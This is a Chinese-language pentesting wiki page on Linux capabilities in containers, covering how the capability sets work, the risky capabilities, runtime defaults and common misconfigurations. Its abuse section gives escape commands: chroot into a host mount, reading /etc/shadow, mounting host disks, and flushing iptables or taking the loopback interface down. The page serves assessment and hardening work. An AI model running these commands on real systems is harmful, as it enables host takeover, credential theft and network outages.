# 容器中的 Linux 能力

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是容器安全中最重要的部分之一，因为它们回答了一个微妙但根本的问题：**容器内部的 "root" 究竟意味着什么？** 在普通的 Linux 系统上，UID 0 历来意味着非常广泛的特权集合。在现代内核中，这些特权被分解为称为 capabilities 的更小的单元。如果相关的 capabilities 被移除，进程即使以 root 身份运行，也可能缺乏许多强大的操作能力。

容器在很大程度上依赖于这种区分。许多工作负载仍以 UID 0 在容器内启动，以兼容性或简化为由。如果不丢弃某些 capability，那将过于危险。通过丢弃 capability，容器化的 root 进程仍能执行许多普通的容器内任务，同时被拒绝更敏感的内核操作。这就是为什么一个显示 `uid=0(root)` 的容器 shell 并不自动等同于“主机 root”或甚至“广泛的内核特权”。capability 集合决定了该 root 身份实际值多少。

有关完整的 Linux capability 参考和许多滥用示例，请参见：

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 工作原理

capabilities 在多个集合中进行跟踪，包括 permitted、effective、inheritable、ambient 和 bounding 集合。对于许多容器评估来说，每个集合在内核层面的精确语义往往不如最终的实际问题重要：**这个进程现在能够成功执行哪些特权操作，未来还有哪些权限提升的可能？**

之所以重要，是因为许多 breakout 技术实际上是被伪装成容器问题的 capability 问题。拥有 `CAP_SYS_ADMIN` 的工作负载可以接触到大量内核功能，这是普通容器内的 root 进程不应触碰的。若工作负载拥有 `CAP_NET_ADMIN` 并且还共享主机网络命名空间，它就变得更加危险。拥有 `CAP_SYS_PTRACE` 的工作负载如果能通过主机 PID 共享看到主机进程，则会更有趣。在 Docker 或 Podman 中这可能表现为 `--pid=host`；在 Kubernetes 中通常表现为 `hostPID: true`。

换句话说，capability 集合不能孤立评估。必须与 namespaces、seccomp 和 MAC policy 一起解读。

## 实验

在容器内检查 capabilities 的一种非常直接的方法是：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
您也可以比较一个更受限的容器与一个添加了所有 capabilities 的容器：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
要查看最小范围添加的效果，尝试先移除所有项，然后只添加回一个 capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
这些小实验有助于表明，运行时并不是简单地切换一个名为 "privileged" 的布尔值。它在塑造进程可用的实际权限面（privilege surface）。

## 高风险 Capabilities

虽然许多 capability 会根据目标不同而重要，但有几类在容器逃逸分析中反复出现并且尤为相关。

**`CAP_SYS_ADMIN`** 是防御方应当最为警惕的一个。它常被描述为“新的 root”，因为它解锁了大量功能，包括与 mount 相关的操作、与 namespace 敏感的行为，以及许多本不该随意暴露给容器的内核路径。如果容器拥有 `CAP_SYS_ADMIN`、seccomp 配置薄弱且没有强力的 MAC 限制，很多经典的突破路径就会变得更现实。

**`CAP_SYS_PTRACE`** 在存在进程可见性的情况下很重要，尤其是当 PID namespace 与主机或与有价值的邻近工作负载共享时。它能将可见性转化为篡改能力。

**`CAP_NET_ADMIN`** 和 **`CAP_NET_RAW`** 在以网络为中心的环境中很重要。在一个隔离的 bridge 网络上它们可能已经存在风险；在共享主机网络 namespace 上则更糟，因为工作负载可能能够重新配置主机网络、嗅探、欺骗或干扰本地流量。

**`CAP_SYS_MODULE`** 在有 root 权限的环境中通常是灾难性的，因为加载内核模块实际上等同于对主机内核的控制。它几乎不应该出现在通用的容器工作负载中。

## 运行时 使用

Docker、Podman、containerd-based stacks 和 CRI-O 都使用 capability 控制，但默认值和管理接口各不相同。Docker 通过类似 `--cap-drop` 和 `--cap-add` 的标志非常直接地暴露这些控制。Podman 提供类似的控制，并且常常通过 rootless execution 获得额外的安全层。Kubernetes 通过 Pod 或容器的 `securityContext` 展示 capability 的添加和移除。像 LXC/Incus 这样的 system-container 环境也依赖 capability 控制，但这些系统与主机的更紧密集成常常会诱使运维比在应用容器环境中更激进地放宽默认设置。

同样的原则适用于所有这些环境：一个技术上可以授予的 capability 并不一定应该被授予。许多现实世界的事件起始于运维人员因为工作负载在更严格的配置下失败而简单地添加了某个 capability，从而寻求快速修复。

## 误配置

最明显的错误是在 Docker/Podman 风格的 CLI 中使用 **`--cap-add=ALL`**，但这并非唯一的问题。实际上，更常见的问题是授予一两个极其强大的 capability，尤其是 `CAP_SYS_ADMIN`，以“让应用运行”，却没有同时理解 namespace、seccomp 和 mount 的含义。另一种常见的失败模式是将额外的 capability 与主机 namespace 共享结合起来。在 Docker 或 Podman 中这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中等效的暴露通常通过工作负载设置如 `hostPID: true` 或 `hostNetwork: true` 出现。每一种组合都会改变该 capability 实际上能影响的范围。

也常见的是管理员误以为因为工作负载并非完全 `--privileged`，所以它仍然受到有意义的约束。有时确实如此，但有时有效的姿态已经足够接近特权，以至于在操作上这一区别不再重要。

## 滥用

第一步是枚举有效的 capability 集，并立即测试那些对逃逸或访问主机信息有影响的 capability 特定操作：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
如果存在 `CAP_SYS_ADMIN`，应首先测试 mount-based abuse 和主机文件系统访问，因为这是最常见的 breakout 启用因素之一：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
如果存在 `CAP_SYS_PTRACE` 且容器可以看到感兴趣的进程，验证该 capability 是否可以转化为 process inspection：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，测试工作负载是否能够操纵可见的网络栈，或至少收集有用的网络情报：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
当一个 capability 测试成功时，将其与 namespace 情况结合起来。在隔离的 namespace 中看似仅有风险的 capability，当 container 也共享 host PID、host network 或 host mounts 时，可能立即成为 escape 或 host-recon primitive。

### 完整示例: `CAP_SYS_ADMIN` + Host Mount = Host Escape

如果 container 拥有 `CAP_SYS_ADMIN` 且有一个可写的 bind mount 指向 host filesystem（例如 `/host`），则 escape 路径通常很直接：
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
如果 `chroot` 成功，命令现在在主机根文件系统上下文中执行:
```bash
id
hostname
cat /etc/shadow | head
```
如果 `chroot` 不可用，通常可以通过在挂载的目录树中调用该二进制文件来实现相同的效果：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完整示例: `CAP_SYS_ADMIN` + 设备访问

如果主机的一个块设备被暴露，`CAP_SYS_ADMIN` 可以将其变为直接访问主机文件系统：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 全示例：`CAP_NET_ADMIN` + 主机网络

这种组合并不总是能直接获得主机 root，但它可以完全重新配置主机的网络栈：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这可能导致拒绝服务、流量拦截，或访问此前被过滤的服务。

## Checks

能力检查的目标不仅是转储原始值，而是要判断进程是否具有足够的特权，使其当前的命名空间和挂载情况变得危险。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
- `capsh --print` 是发现高风险特权（例如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`）的最简单方法。
- `/proc/self/status` 中的 `CapEff` 行显示当前实际生效的特权，而不仅仅是可能存在于其他集合中的那些。
- 如果容器还共享宿主机的 PID、网络或 user namespaces，或包含可写的宿主挂载点，capability dump 就变得更重要。

在收集到原始 capability 信息后，下一步是对其进行解释。要问自己：进程是否为 root？user namespaces 是否启用？是否共享了宿主命名空间？seccomp 是否在生效？AppArmor 或 SELinux 是否仍然限制该进程？单独的 capability 集只是故事的一部分，但通常就是能解释为什么在相同初始条件下一个 container breakout 成功而另一个失败的关键因素。

## 运行时默认值

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动放宽 |
| --- | --- | --- | --- |
| Docker Engine | 默认情况下为精简的 capability 集 | Docker 保持默认的 allowlist（允许列表）并丢弃其余 capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 默认情况下为精简的 capability 集 | Podman 容器默认非特权，使用精简的 capability 模型 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 除非更改，否则继承运行时默认值 | 如果未指定 `securityContext.capabilities`，容器将从运行时获得默认的 capability 集 | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 通常为运行时默认值 | 有效集合取决于运行时和 Pod 规范 | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

对于 Kubernetes，重要的一点是 API 并未定义一个通用的默认 capability 集。如果 Pod 未添加或删除 capabilities，工作负载将继承该节点的运行时默认值。
{{#include ../../../../banners/hacktricks-training.md}}
